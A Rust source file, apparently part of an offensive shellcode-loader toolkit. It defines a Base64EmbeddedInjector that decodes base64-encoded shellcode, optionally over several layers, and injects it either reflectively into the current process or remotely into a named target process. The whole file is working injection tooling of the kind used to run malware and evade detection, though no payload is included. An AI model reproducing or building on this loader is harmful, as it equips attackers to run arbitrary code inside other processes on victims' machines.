use crate::injectors::{
    Injector,
    InjectorType,
    InjectionType::{self, Reflect, Remote},
    reflective_inject,
    remote_inject,
    decode_b64_shellcode
};
///
/// This Injector uses a [String] for its `shellcode` property for 
/// ergonomics when creating the Injector. Its `inject()` method will
/// convert the String to a [Vec<u8>] for decoding and injection.
/// 
pub struct Base64EmbeddedInjector {
    wait: bool,
    shellcode: Option<String>,
    n_iterations: usize
}

impl Base64EmbeddedInjector {
    #[allow(unused)]
    pub fn new() -> Base64EmbeddedInjector {
        Base64EmbeddedInjector { wait: false, shellcode: None, n_iterations: 1 }
    }

    ///
    /// Builder function to set the iterations.
    /// 
    #[allow(unused)]
    pub fn iterations(self, n_iterations: usize) -> Base64EmbeddedInjector {
        Base64EmbeddedInjector { wait: self.wait, shellcode: self.shellcode, n_iterations: n_iterations }
    }

}

impl Injector for Base64EmbeddedInjector {
    fn load(self, sc_source: InjectorType) -> Result<Base64EmbeddedInjector, String> {
        use InjectorType::Base64Embedded;
        match sc_source {
            Base64Embedded(sc) => {
                Ok(Base64EmbeddedInjector { wait: false, shellcode: Some(sc), n_iterations: self.n_iterations })
            }
            _ => Err("Incorrect Shellcode Type!".to_string())
        }
    }

    fn wait(self, wait: bool) -> Result<Base64EmbeddedInjector, String> {
        Ok(Base64EmbeddedInjector { wait, shellcode: self.shellcode, n_iterations: self.n_iterations })
    }

    fn inject(&self, injection_type: InjectionType) -> Result<(), String> {

        match &self.shellcode {
            Some(sc) => {
                let sc_bytes = sc.as_bytes().to_vec();
                let decoded_shellcode = decode_b64_shellcode(&sc_bytes, self.n_iterations).unwrap();
                match injection_type {
                    Reflect => unsafe { reflective_inject(&decoded_shellcode, self.wait) },
                    Remote(proc_name) => unsafe { remote_inject(&decoded_shellcode, self.wait, &proc_name) },
                }
            },
            None => Err("No shellcode loaded!".to_string())
        }
        
    }
}